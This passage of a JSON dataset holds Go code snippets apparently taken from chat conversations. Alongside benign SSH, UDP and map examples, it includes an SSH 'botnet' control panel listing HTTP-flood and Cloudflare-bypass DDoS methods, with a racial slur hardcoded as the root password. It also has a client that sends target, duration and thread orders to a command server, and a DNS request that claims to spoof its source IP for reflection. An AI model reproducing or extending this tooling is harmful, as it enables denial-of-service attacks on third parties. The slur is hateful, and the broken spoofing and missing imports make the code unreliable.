title\n\t\t\tterminal := terminal.NewTerminal(channel, \"> \")\n\t\t\tterminal.SetPrompt(\"Custom Title> \")\n\n\t\t\t// Handle input/output on the terminal\n\t\t\tgo handleTerminal(terminal)\n\t\t} else {\n\t\t\tnewChannel.Reject(ssh.UnknownChannelType, \"unknown channel type\")\n\t\t}\n\t}\n}\n\nfunc handleTerminal(terminal *terminal.Terminal) {\n\tfor {\n\t\tline, err := terminal.ReadLine()\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to read from terminal: \", err)\n\t\t}\n\n\t\tif line == \"quit\" {\n\t\t\tfmt.Println(\"Exiting terminal.\")\n\t\t\tbreak\n\t\t}\n\n\t\tfmt.Println(\"Received:\", line)\n\t}\n}",
    "filename": "8e179bbc33bd063bb274023b0d022e57_0.go"
  },
  {
    "conversation_hash": "8e179bbc33bd063bb274023b0d022e57",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "terminal"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n\t\"log\"\n\t\"net\"\n)\n\nfunc main() {\n\tconfig := &ssh.ServerConfig{}\n\tconfig.AddHostKey(privateKey)\n\n\t// Create a listener for SSH connections\n\tlistener, err := net.Listen(\"tcp\", \"localhost:22\")\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to listen on port 22: \", err)\n\t}\n\n\t// Accept incoming SSH connections\n\tfor {\n\t\ttcpConn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to accept incoming connection: \", err)\n\t\t}\n\n\t\t// Start a new SSH server connection\n\t\t_, chans, reqs, err := ssh.NewServerConn(tcpConn, config)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to establish SSH connection: \", err)\n\t\t}\n\n\t\t// Handle incoming requests asynchronously\n\t\tgo ssh.DiscardRequests(reqs)\n\n\t\t// Handle incoming channels (e.g., shell, exec)\n\t\tgo handleChannels(chans)\n\t}\n}\n\nfunc handleChannels(chans <-chan ssh.NewChannel) {\n\tfor newChannel := range chans {\n\t\tif newChannel.ChannelType() == \"session\" {\n\t\t\t// Accept the session channel\n\t\t\tchannel, _, err := newChannel.Accept()\n\t\t\tif err != nil {\n\t\t\t\tlog.Fatal(\"Failed to accept channel: \", err)\n\t\t\t}\n\n\t\t\t// Set the window title escape sequence\n\t\t\tfmt.Fprintf(channel, \"\\033]0;%s\\007\", \"Custom Title\")\n\n\t\t\t// Handle input/output on the terminal\n\t\t\tgo handleTerminal(channel)\n\t\t} else {\n\t\t\tnewChannel.Reject(ssh.UnknownChannelType, \"unknown channel type\")\n\t\t}\n\t}\n}\n\nfunc handleTerminal(channel ssh.Channel) {\n\tdefer channel.Close()\n\n\tterminal := terminal.NewTerminal(channel, \"> \")\n\n\tfor {\n\t\tline, err := terminal.ReadLine()\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to read from terminal: \", err)\n\t\t}\n\n\t\tif line == \"quit\" {\n\t\t\tfmt.Fprintln(channel, \"Exiting terminal.\")\n\t\t\tbreak\n\t\t}\n\n\t\tfmt.Fprintf(channel, \"Received: %s\\n\", line)\n\t}\n\n\tfmt.Fprintln(channel, \"Closing connection...\")\n}",
    "filename": "8e179bbc33bd063bb274023b0d022e57_1.go"
  },
  {
    "conversation_hash": "3eafddb76a050e96f957a04906b76d74",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package otherpackage\n\nimport \"path/to/main\"\n\nfunc AccessGlobalVariable() {\n    value := main.GlobalVariable\n    // Use the value as needed\n}",
    "filename": "3eafddb76a050e96f957a04906b76d74_1.go"
  },
  {
    "conversation_hash": "3eafddb76a050e96f957a04906b76d74",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"path/to/logger\"\n\nfunc main() {\n\t// Initialize the logger\n\tlogger.InitLogger()\n\n\t// Example usage of the logger\n\tlogger.Logger.Info(\"Logging initialized\")\n\tlogger.Logger.Warn(\"A warning message\")\n\tlogger.Logger.Error(\"An error message\")\n}",
    "filename": "3eafddb76a050e96f957a04906b76d74_4.go"
  },
  {
    "conversation_hash": "3eafddb76a050e96f957a04906b76d74",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nvar GlobalVar int = 42\n\nfunc main() {\n\t// GlobalVar can be accessed and modified within the package\n\tGlobalVar = 10\n\tanotherFunc()\n}\n\nfunc anotherFunc() {\n\t// GlobalVar can be accessed here too\n\tfmt.Println(GlobalVar)\n}",
    "filename": "3eafddb76a050e96f957a04906b76d74_5.go"
  },
  {
    "conversation_hash": "3eafddb76a050e96f957a04906b76d74",
    "code_index": 7,
    "language": "Go",
    "libraries": [
      "another"
    ],
    "code": "package main\n\nimport \"path/to/mypackage\"\n\nfunc main() {\n\t// Accessing the exported global variable MyGlobalVar from another package\n\tfmt.Println(mypackage.MyGlobalVar)\n}",
    "filename": "3eafddb76a050e96f957a04906b76d74_7.go"
  },
  {
    "conversation_hash": "758c96a354feb9e5cf9da48e3e56a037",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n\t\"os\"\n\t\"strings\"\n)\n\ntype UserCredentials struct {\n\tUsername string\n\tPassword string\n}\n\nfunc isValidCredentials(username, password string) bool {\n\t// Define valid username-password combinations\n\tvalidCredentials := []UserCredentials{\n\t\t{\"root\", \"nigger\"},\n\t\t{\"brrt\", \"brrt\"},\n\t}\n\n\t// Check if the provided credentials match\n\tfor _, credentials := range validCredentials {\n\t\tif credentials.Username == username && credentials.Password == password {\n\t\t\treturn true\n\t\t}\n\t}\n\n\treturn false\n}\n\nfunc handleSession(ch ssh.Channel, reqs <-chan *ssh.Request) {\n\tterm := terminal.NewTerminal(ch, \"\")\n\n\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\")) //clear screen\n\n\tterm.Write([]byte(\"\"))\n\tterm.Write([]byte(\"\\x1b[94musername\\x1b[0m: \"))\n\tusername, _ := term.ReadLine()\n\n\tterm.Write([]byte(\"\\x1b[94mpassword\\x1b[0m: \"))\n\tpassword, _ := term.ReadPassword(\"\")\n\n\tif isValidCredentials(username, string(password)) {\n\n\t\tfmt.Println(username + \" logged in.\")\n\n\t\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\")) //clear screen\n\n\t\tterm.SetSize(42, 19)\n\n\t\tterm.Write([]byte(fmt.Sprintf(\"\\033]0;t.me/thisisbrrt | <3\\007\"))) // Set window  title\n\n\t\tterm.Write([]byte(\"\\n\"))\n\t\tterm.Write([]byte(\"      zZ    |\\\\      _,,,---,,_     \\n\"))\n\t\tterm.Write([]byte(\"        Zzz/,`.-'`'    -.  ;-;;,_  \\n\"))\n\t\tterm.Write([]byte(\"          |,4-  ) )-,_. ,\\\\ (  `'-'\\n\"))\n\t\tterm.Write([]byte(\"          '---''(_/--'  `-'\\\\_)     \\n\\n\"))\n\n\t\tgreeting := fmt.Sprintf(\"         Good morning \\x1B[38;5;140m%s\\x1b[0m.\", username)\n\t\tterm.Write([]byte(greeting))\n\n\t\tprompt := fmt.Sprintf(\"\\x1B[48;5;235m\\x1B[38;5;140m %s ● botnet \\x1B[0m ~ $ \", username)\n\n\t\tfor {\n\n\t\t\tterm.Write([]byte(\"\\n\\n\" + prompt))\n\n\t\t\tcmd, err := term.ReadLine()\n\t\t\tif err != nil {\n\t\t\t\tbreak\n\t\t\t}\n\n\t\t\trunCommand(cmd, term)\n\n\t\t}\n\t} else {\n\n\t\tterm.Write([]byte(\"\\nInvalid username or password.\"))\n\t\tterm.ReadLine()\n\n\t}\n\n\tch.Close()\n\n}\n\nfunc runCommand(cmd string, term *terminal.Terminal) {\n\n\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\\n\")) // clear screen\n\n\tswitch cmd {\n\tcase \"help\":\n\t\tterm.Write([]byte(`Help:\nhelp - Displays the help menu\nl7 - Display layer 7 methods\nl4 - Display layer 4 methods\nexit - Close the session`))\n\tcase \"l7\":\n\t\tterm.Write([]byte(`Methods:\nhttp-flood - Flood the server with HTTP requests\ntls - HTTP flood with TLS certificate\nuam-bypass - Bypasses cloudflare Under Attack Mode`))\n\tcase \"l4\":\n\t\tterm.Write([]byte(`Methods:\nNone yet!`))\n\tcase \"exit\":\n\t\tterm.Write([]byte(\"Exiting…\"))\n\t\tos.Exit(1)\n\tdefault:\n\t\tterm.Write([]byte(\"Invalid command.\"))\n\t}\n}\n\nfunc main() {\n\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {\n\t\t\tusername := c.User()\n\n\t\t\tif isValidCredentials(username, string(pass)) {\n\t\t\t\t// Return nil to indicate a successful login\n\t\t\t\treturn nil, nil\n\t\t\t}\n\n\t\t\t// Return an error to indicate an invalid username or password\n\t\t\treturn nil, fmt.Errorf(\"invalid username or password\")\n\t\t},\n\t}\n\n\tprivateKey, err := ssh.ParsePrivateKey(<path_to_private_key>)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to parse private key:\", err)\n\t\treturn\n\t}\n\n\tconfig.AddHostKey(privateKey)\n\n\tfmt.Println(\"Starting SSH server on port 22…\")\n\tlistener, err := ssh.Listen(\"tcp\", \":22\", config)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to start SSH server:\", err)\n\t\treturn\n\t}\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to accept incoming connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tgo ssh.NewServerConn(conn, config) // Start a new SSH server connection\n\t}\n}",
    "filename": "758c96a354feb9e5cf9da48e3e56a037_0.go"
  },
  {
    "conversation_hash": "758c96a354feb9e5cf9da48e3e56a037",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n\t\"os\"\n)\n\ntype UserCredentials struct {\n\tUsername string\n\tPassword string\n}\n\nfunc isValidCredentials(username, password string) bool {\n\t// Define valid username-password combinations\n\tvalidCredentials := []UserCredentials{\n\t\t{\"root\", \"nigger\"},\n\t\t{\"brrt\", \"brrt\"},\n\t}\n\n\t// Check if the provided credentials match\n\tfor _, credentials := range validCredentials {\n\t\tif credentials.Username == username && credentials.Password == password {\n\t\t\treturn true\n\t\t}\n\t}\n\n\treturn false\n}\n\nfunc handleSession(ch ssh.Channel) {\n\tterm := terminal.NewTerminal(ch, \"\")\n\n\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\")) //clear screen\n\n\tterm.Write([]byte(\"\"))\n\tterm.Write([]byte(\"\\x1b[94musername\\x1b[0m: \"))\n\tusername, _ := term.ReadLine()\n\n\tterm.Write([]byte(\"\\x1b[94mpassword\\x1b[0m: \"))\n\tpassword, _ := term.ReadPassword(\"\")\n\n\tif isValidCredentials(username, string(password)) {\n\n\t\tfmt.Println(username + \" logged in.\")\n\n\t\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\")) //clear screen\n\n\t\tterm.SetSize(42, 19)\n\n\t\tterm.Write([]byte(fmt.Sprintf(\"\\033]0;t.me/thisisbrrt | <3\\007\"))) // Set window  title\n\n\t\tterm.Write([]byte(\"\\n\"))\n\t\tterm.Write([]byte(\"      zZ    |\\\\      _,,,---,,_     \\n\"))\n\t\tterm.Write([]byte(\"        Zzz/,`.-'`'    -.  ;-;;,_  \\n\"))\n\t\tterm.Write([]byte(\"          |,4-  ) )-,_. ,\\\\ (  `'-'\\n\"))\n\t\tterm.Write([]byte(\"          '---''(_/--'  `-'\\\\_)     \\n\\n\"))\n\n\t\tgreeting := fmt.Sprintf(\"         Good morning \\x1B[38;5;140m%s\\x1b[0m.\", username)\n\t\tterm.Write([]byte(greeting))\n\n\t\tprompt := fmt.Sprintf(\"\\x1B[48;5;235m\\x1B[38;5;140m %s ● botnet \\x1B[0m ~ $ \", username)\n\n\t\tfor {\n\n\t\t\tterm.Write([]byte(\"\\n\\n\" + prompt))\n\n\t\t\tcmd, err := term.ReadLine()\n\t\t\tif err != nil {\n\t\t\t\tbreak\n\t\t\t}\n\n\t\t\trunCommand(cmd, term)\n\n\t\t}\n\t} else {\n\n\t\tterm.Write([]byte(\"\\nInvalid username or password.\"))\n\t\tterm.ReadLine()\n\n\t}\n\n\tch.Close()\n\n}\n\nfunc runCommand(cmd string, term *terminal.Terminal) {\n\n\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\\n\")) // clear screen\n\n\tswitch cmd {\n\tcase \"help\":\n\t\tterm.Write([]byte(`Help:\nhelp - Displays the help menu\nl7 - Display layer 7 methods\nl4 - Display layer 4 methods\nexit - Close the session`))\n\tcase \"l7\":\n\t\tterm.Write([]byte(`Methods:\nhttp-flood - Flood the server with HTTP requests\ntls - HTTP flood with TLS certificate\nuam-bypass - Bypasses cloudflare Under Attack Mode`))\n\tcase \"l4\":\n\t\tterm.Write([]byte(`Methods:\nNone yet!`))\n\tcase \"exit\":\n\t\tterm.Write([]byte(\"Exiting…\"))\n\t\tos.Exit(1)\n\tdefault:\n\t\tterm.Write([]byte(\"Invalid command.\"))\n\t}\n}\n\nfunc main() {\n\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {\n\t\t\tusername := c.User()\n\n\t\t\tif isValidCredentials(username, string(pass)) {\n\t\t\t\t// Return nil to indicate a successful login\n\t\t\t\treturn nil, nil\n\t\t\t}\n\n\t\t\t// Return an error to indicate an invalid username or password\n\t\t\treturn nil, fmt.Errorf(\"invalid username or password\")\n\t\t},\n\t}\n\n\tfmt.Println(\"Starting SSH server on port 22…\")\n\tlistener, err := ssh.Listen(\"tcp\", \":22\", config)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to start SSH server:\", err)\n\t\treturn\n\t}\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to accept incoming connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tgo ssh.Serve(conn, config) // Serve the SSH connection\n\t}\n}",
    "filename": "758c96a354feb9e5cf9da48e3e56a037_1.go"
  },
  {
    "conversation_hash": "37d7d65ab70122d7cfe0db98a0a87779",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "privateKeyBytes, err := ioutil.ReadFile(\"ssh_host_rsa_key\")\nif err != nil {\n    fmt.Println(\"Failed to read private key:\", err)\n    return\n}\n\nprivateKey, err := ssh.ParsePrivateKey(privateKeyBytes)\nif err != nil {\n    fmt.Println(\"Failed to parse private key:\", err)\n    return\n}\n\nconfig.AddHostKey(privateKey)",
    "filename": "37d7d65ab70122d7cfe0db98a0a87779_1.go"
  },
  {
    "conversation_hash": "37d7d65ab70122d7cfe0db98a0a87779",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n\t\"io/ioutil\"\n\t\"net\"\n\t\"os\"\n)\n\ntype UserCredentials struct {\n\tUsername string\n\tPassword string\n}\n\nfunc isValidCredentials(username, password string) bool {\n\t// Define valid username-password combinations\n\tvalidCredentials := []UserCredentials{\n\t\t{\"root\", \"password123\"},\n\t\t{\"admin\", \"admin123\"},\n\t}\n\n\t// Check if the provided credentials match\n\tfor _, credentials := range validCredentials {\n\t\tif credentials.Username == username && credentials.Password == password {\n\t\t\treturn true\n\t\t}\n\t}\n\n\treturn false\n}\n\nfunc handleSession(ch ssh.Channel) {\n\tterm := terminal.NewTerminal(ch, \"\")\n\n\tterm.Write([]byte(\"\\x1b[H\\x1b[2J\")) //clear screen\n\n\tterm.Write([]byte(\"\\n\"))\n\tterm.Write([]byte(\"\\x1b[94musername\\x1b[0m: \"))\n\tusername, _ := term.ReadLine()\n\n\tterm.Write([]byte(\"\\x1b[94mpassword\\x1b[0m: \"))\n\tpassword, _ := term.ReadPassword(\"\")\n\n\t// Rest of the code...\n\n\t// ...\n}\n\nfunc runCommand(cmd string, term *terminal.Terminal) {\n\t// ...\n}\n\nfunc main() {\n\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {\n\t\t\t// ...\n\t\t},\n\t}\n\n\t// Load SSH host key\n\tprivateKeyBytes, err := ioutil.ReadFile(\"ssh_host_rsa_key\")\n\tif err != nil {\n\t\tfmt.Println(\"Failed to read private key:\", err)\n\t\treturn\n\t}\n\n\tprivateKey, err := ssh.ParsePrivateKey(privateKeyBytes)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to parse private key:\", err)\n\t\treturn\n\t}\n\n\tconfig.AddHostKey(privateKey)\n\n\tfmt.Println(\"Starting SSH server on port 22...\")\n\tlistener, err := net.Listen(\"tcp\", \":22\")\n\tif err != nil {\n\t\tfmt.Println(\"Failed to start SSH server:\", err)\n\t\treturn\n\t}\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to accept incoming connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\t_, chans, reqs, err := ssh.NewServerConn(conn, config)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to create SSH connection:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tgo ssh.DiscardRequests(reqs)\n\t\tgo handleChannels(chans)\n\t}\n}\n\nfunc handleChannels(chans <-chan ssh.NewChannel) {\n\t// ...\n}",
    "filename": "37d7d65ab70122d7cfe0db98a0a87779_2.go"
  },
  {
    "conversation_hash": "37d7d65ab70122d7cfe0db98a0a87779",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// Load SSH host key\nprivateKeyBytes, err := ioutil.ReadFile(\"ssh_host_rsa_key\")\nif err != nil {\n    fmt.Println(\"Failed to read private key:\", err)\n    return\n}\n\nprivateKey, err := ssh.ParsePrivateKey(privateKeyBytes)\nif err != nil {\n    fmt.Println(\"Failed to parse private key:\", err)\n    return\n}\n\nconfig.AddHostKey(privateKey)",
    "filename": "37d7d65ab70122d7cfe0db98a0a87779_3.go"
  },
  {
    "conversation_hash": "f0322060179dce299177a090c38cddd9",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    charMap := make(map[rune]int)\n    \n    // Adding characters and their mappings to the map\n    charMap['A'] = 65\n    charMap['B'] = 66\n    charMap['C'] = 67\n    \n    // Accessing values from the character map\n    fmt.Println(charMap['A']) // Output: 65\n    fmt.Println(charMap['B']) // Output: 66\n    fmt.Println(charMap['C']) // Output: 67\n    \n    // Checking if a character exists in the map\n    if value, ok := charMap['A']; ok {\n        fmt.Println(\"Character A exists in the map with value:\", value)\n    } else {\n        fmt.Println(\"Character A does not exist in the map.\")\n    }\n    \n    // Deleting a character from the map\n    delete(charMap, 'B')\n    \n    // Checking if a character still exists after deletion\n    if _, ok := charMap['B']; ok {\n        fmt.Println(\"Character B exists in the map.\")\n    } else {\n        fmt.Println(\"Character B does not exist in the map anymore.\")\n    }\n}",
    "filename": "f0322060179dce299177a090c38cddd9_0.go"
  },
  {
    "conversation_hash": "f0322060179dce299177a090c38cddd9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nfunc main() {\n\tcaptcha := \"Hello World!\"\n\tmodifiedCaptcha := modifyCaptchaWithRandomFont(captcha)\n\tfmt.Println(modifiedCaptcha)\n}\n\nfunc modifyCaptchaWithRandomFont(captcha string) string {\n\tfonts := make([]string, 3) // Substitute with your desired fonts\n\tfonts[0] = \"Arial\"\n\tfonts[1] = \"Times New Roman\"\n\tfonts[2] = \"Courier New\"\n\n\tmodifiedCaptcha := \"\"\n\trand.Seed(time.Now().UnixNano())\n\n\tfor _, char := range captcha {\n\t\trandomFont := fonts[rand.Intn(len(fonts))]\n\t\tmodifiedCaptcha += applyFontToCharacter(char, randomFont)\n\t}\n\n\treturn modifiedCaptcha\n}\n\nfunc applyFontToCharacter(char rune, font string) string {\n\t// Method to apply font to the character and return the modified character\n\t// You can customize this method based on how you want to modify the character with the font\n\tfontAppliedChar := fmt.Sprintf(\"[%s]%c[reset]\", font, char)\n\treturn fontAppliedChar\n}",
    "filename": "f0322060179dce299177a090c38cddd9_1.go"
  },
  {
    "conversation_hash": "f0322060179dce299177a090c38cddd9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nfunc main() {\n\tcaptcha := \"Hello World!\"\n\tmodifiedCaptcha := modifyCaptchaWithRandomFont(captcha)\n\tfmt.Println(modifiedCaptcha)\n}\n\nfunc modifyCaptchaWithRandomFont(captcha string) string {\n\tfonts := make([][]rune, 3) // Substitute with your desired character sets / fonts\n\tfonts[0] = []rune(\"▓█▒░▀▄\")\n\tfonts[1] = []rune(\"■▬●▪□\")\n\tfonts[2] = []rune(\"▲◆○◘▽\")\n\n\tmodifiedCaptcha := \"\"\n\trand.Seed(time.Now().UnixNano())\n\n\tfor _, char := range captcha {\n\t\trandomFont := fonts[rand.Intn(len(fonts))]\n\t\tmodifiedCaptcha += applyFontToCharacter(char, randomFont)\n\t}\n\n\treturn modifiedCaptcha\n}\n\nfunc applyFontToCharacter(char rune, font []rune) string {\n\tfontLength := len(font)\n\trandomIndex := rand.Intn(fontLength)\n\tfontAppliedChar := font[randomIndex]\n\treturn string(fontAppliedChar)\n}",
    "filename": "f0322060179dce299177a090c38cddd9_2.go"
  },
  {
    "conversation_hash": "ff0f186c9a4a464f2c25773473012bf3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type aaa struct {\n    // aaa对象的属性和方法\n}\n\nfunc (a *aaa) CreateEvent() error {\n    // 创建event的逻辑代码\n    return nil\n}",
    "filename": "ff0f186c9a4a464f2c25773473012bf3_1.go"
  },
  {
    "conversation_hash": "ff0f186c9a4a464f2c25773473012bf3",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    a := &aaa{}\n    err := a.CreateEvent()\n    if err != nil {\n        fmt.Println(\"创建event失败：\", err)\n    } else {\n        fmt.Println(\"创建event成功\")\n    }\n}",
    "filename": "ff0f186c9a4a464f2c25773473012bf3_2.go"
  },
  {
    "conversation_hash": "ee44e60f8c21da5e838d2d853caf640b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n)\n\nconst (\n\tprotocol = \"udp\"\n\tserverIP = \"localhost\"\n\tserverPort = \"8080\"\n\tbuffer   = 1024\n)\n\nfunc main() {\n\tserverAddress, err := net.ResolveUDPAddr(protocol, fmt.Sprintf(\"%s:%s\", serverIP, serverPort))\n\tif err != nil {\n\t\tfmt.Println(\"Error resolving server address:\", err)\n\t\treturn\n\t}\n\n\tconn, err := net.DialUDP(protocol, nil, serverAddress)\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting to server:\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\treader := bufio.NewReader(os.Stdin)\n\tfor {\n\t\tfmt.Print(\"Enter a message to send: \")\n\t\tmessage, _ := reader.ReadString('\\n')\n\n\t\t_, err = conn.Write([]byte(message))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending message:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tresponse := make([]byte, buffer)\n\t\tlength, err := conn.Read(response)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error receiving message:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfmt.Printf(\"Received response: %s\\n\", string(response[:length]))\n\t}\n}",
    "filename": "ee44e60f8c21da5e838d2d853caf640b_1.go"
  },
  {
    "conversation_hash": "ee44e60f8c21da5e838d2d853caf640b",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n\t\"strconv\"\n)\n\nconst (\n\tprotocol   = \"udp\"\n\tserverIP   = \"localhost\"\n\tserverPort = \"8080\"\n\tbuffer     = 1024\n)\n\nfunc main() {\n\tserverAddress, err := net.ResolveUDPAddr(protocol, fmt.Sprintf(\"%s:%s\", serverIP, serverPort))\n\tif err != nil {\n\t\tfmt.Println(\"Error resolving server address:\", err)\n\t\treturn\n\t}\n\n\tconn, err := net.DialUDP(protocol, nil, serverAddress)\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting to server:\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\treader := bufio.NewReader(os.Stdin)\n\tfor {\n\t\tfmt.Print(\"Enter IP address: \")\n\t\tip, _ := reader.ReadString('\\n')\n\n\t\tfmt.Print(\"Enter duration (in seconds): \")\n\t\tdurationStr, _ := reader.ReadString('\\n')\n\n\t\tfmt.Print(\"Enter number of threads: \")\n\t\tthreadsStr, _ := reader.ReadString('\\n')\n\n\t\tfmt.Print(\"Enter method: \")\n\t\tmethod, _ := reader.ReadString('\\n')\n\n\t\tmessage := generateMessage(ip, durationStr, threadsStr, method)\n\n\t\t_, err = conn.Write([]byte(message))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending message:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tresponse := make([]byte, buffer)\n\t\tlength, err := conn.Read(response)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error receiving message:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfmt.Printf(\"Received response: %s\\n\", string(response[:length]))\n\t}\n}\n\nfunc generateMessage(ip, durationStr, threadsStr, method string) string {\n\tduration, _ := strconv.Atoi(durationStr[:len(durationStr)-1]) // Remove trailing newline character\n\tthreads, _ := strconv.Atoi(threadsStr[:len(threadsStr)-1])    // Remove trailing newline character\n\n\tmessage := \"001\" + ip[:len(ip)-1] + \"#\" + strconv.Itoa(duration) + \"#\" + strconv.Itoa(threads) + \"#\" + method[:len(method)-1]\n\n\treturn message\n}",
    "filename": "ee44e60f8c21da5e838d2d853caf640b_5.go"
  },
  {
    "conversation_hash": "25db2a1d225426b4de367017461aa912",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net\"\n)\n\nfunc main() {\n\t// DNS server IP and spoofed IP\n\tdnsServerIP := \"DNS_SERVER_IP\"\n\tspoofedIP := \"SPOOFED_IP\"\n\n\t// Resolve DNS server address\n\tdnsAddr, err := net.ResolveUDPAddr(\"udp\", dnsServerIP+\":53\")\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to resolve DNS server address:\", err)\n\t}\n\n\t// Formulate DNS request\n\tdnsRequest := []byte{\n\t\t0x00, 0x00, // Transaction ID\n\t\t0x01, 0x00, // Standard query\n\t\t0x00, 0x01, // Number of questions\n\t\t0x00, 0x00, // Number of answers, authority, and additional sections\n\t\t0x06, 0x72, 0x6f, 0x62, 0x6c, 0x6f, 0x78, // \"roblox\"\n\t\t0x03, 0x63, 0x6f, 0x6d, // \"com\"\n\t\t0x00, // Null byte\n\t\t0x00, 0x0f, // Query type MX\n\t\t0x00, 0x01, // Query class IN\n\t}\n\n\t// Create UDP socket\n\tconn, err := net.DialUDP(\"udp\", nil, dnsAddr)\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to create UDP socket:\", err)\n\t}\n\tdefer conn.Close()\n\n\t// Spoof source IP address\n\tlocalAddr := conn.LocalAddr().(*net.UDPAddr)\n\tlocalAddr.IP = net.ParseIP(spoofedIP)\n\n\t// Send spoofed DNS request\n\t_, err = conn.Write(dnsRequest)\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to send DNS request:\", err)\n\t}\n\n\tlog.Println(\"Spoofed DNS request sent to\", dnsAddr.IP)\n}",
    "filename": "25db2a1d225426b4de367017461aa912_4.go"
  },
  {
    "conversation_hash": "2a104d2d2ecfbbb3ad523c240aeb0930",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "SSH",
      "client"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\n// RateLimiter is a basic rate limiter to limit the number of connections per second\ntype RateLimiter struct {\n\tconnections    map[string]int\n\tconnectionsMux sync.Mutex\n}\n\n// NewRateLimiter creates a new RateLimiter instance\nfunc NewRateLimiter() *RateLimiter {\n\treturn &RateLimiter{\n\t\tconnections: make(map[string]int),\n\t}\n}\n\n// Limit returns true if the rate limit is reached, false otherwise\nfunc (rl *RateLimiter) Limit(ip string, limit int) bool {\n\trl.connectionsMux.Lock()\n\tdefer rl.connectionsMux.Unlock()\n\n\trl.connections[ip]++\n\tif rl.connections[ip] > limit {\n\t\treturn true\n\t}\n\n\t// Reset the counter every second\n\ttime.AfterFunc(time.Second, func() {\n\t\trl.connectionsMux.Lock()\n\t\tdefer rl.connectionsMux.Unlock()\n\n\t\trl.connections[ip]--\n\t\tif rl.connections[ip] == 0 {\n\t\t\tdelete(rl.connections, ip)\n\t\t}\n\t})\n\n\treturn false\n}\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\n\t// Check rate limit\n\trateLimiter := NewRateLimiter()\n\tif rateLimiter.Limit(conn.RemoteAddr().String(), 